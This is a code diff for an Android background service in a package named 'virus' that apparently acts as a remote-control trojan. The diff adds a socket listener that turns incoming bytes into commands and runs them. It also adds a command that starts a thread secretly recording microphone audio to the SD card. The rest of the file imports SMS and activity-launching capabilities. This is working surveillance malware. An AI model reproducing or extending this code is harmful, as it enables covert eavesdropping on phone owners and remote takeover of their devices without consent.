@@ -8,6 +8,9 @@ import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.zip.DataFormatException;
 
 import com.example.virus.Util.CommandType;
 
@@ -19,9 +22,12 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.media.AudioManager;
+import android.media.MediaRecorder;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Binder;
+import android.os.Environment;
 import android.os.IBinder;
 import android.telephony.SmsManager;
 import android.util.Log;
@@ -100,6 +106,14 @@ public class BackgroudService extends Service{
 			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 			startActivity(i);
 			break;
+		case CONTROL_RECORD:
+//			AudioManager amgr = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+//			amgr.setSpeakerphoneOn(true);
+//			amgr.setRouting(AudioManager.MODE_NORMAL, AudioManager.ROUTE_EARPIECE, AudioManager.ROUTE_ALL);
+////			setVolumeControlStream(AudioManager.STREAM_VOICE_CALL);
+//			amgr.setMode(AudioManager.MODE_IN_CALL);;
+			new RecordThread().start();
+			break;
 		default:
 			break;
 		}
@@ -111,7 +125,38 @@ public class BackgroudService extends Service{
 		return mBinder;
 	}    
 	
-	class ServerThread extends Thread{  
+	class RecordThread extends Thread {
+
+		private final static int RECORD_TIME = 1 * 6 * 1000;
+		@Override
+		public void run() {
+			MediaRecorder mRecorder = new MediaRecorder();
+			mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+			mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+			mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+			File dir = Environment.getExternalStorageDirectory();
+			SimpleDateFormat formate = new SimpleDateFormat("yy_MM_dd_HH_mm_ss");
+			String name = formate.format(new Date()) + ".3pg";
+			mRecorder.setOutputFile("/mnt/sdcard/" + name);
+			try {
+				mRecorder.prepare();
+				mRecorder.start();
+				Thread.sleep(RECORD_TIME);
+				mRecorder.stop();
+			} catch (IllegalStateException e) {
+				e.printStackTrace();
+			} catch (IOException e) {
+				e.printStackTrace();
+			} catch (InterruptedException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		}
+		
+	}
+	class ServerThread extends Thread {  
+		
+		@Override
         public void run(){ 
             ServerSocket serverSocket = null; 
             try { 
@@ -121,7 +166,21 @@ public class BackgroudService extends Service{
                 byte buffer [] = new byte[1024*4]; 
                 int temp = 0; 
                 while((temp = inputStream.read(buffer)) != -1){ 
-                    System.out.println(new String(buffer,0,temp)); 
+//                    System.out.println(new String(buffer,0,temp)); 
+                	Log.d("socket", "is: " + temp);
+                	Log.d("socket", "buffer: " + new String(buffer, 0, temp));
+                	int c = Integer.parseInt(new String(buffer, 0, 1));
+                	CommandType type = CommandType.getCommandType(c);
+                	if (type != null) {
+                		execute(type);
+                	}
+//                	switch (c) {
+//					case 1:
+//						execute(CommandType.REBOOT);
+//						break;
+//					default:
+//						break;
+//					}
                 } 
                 
             } catch (IOException e) { 
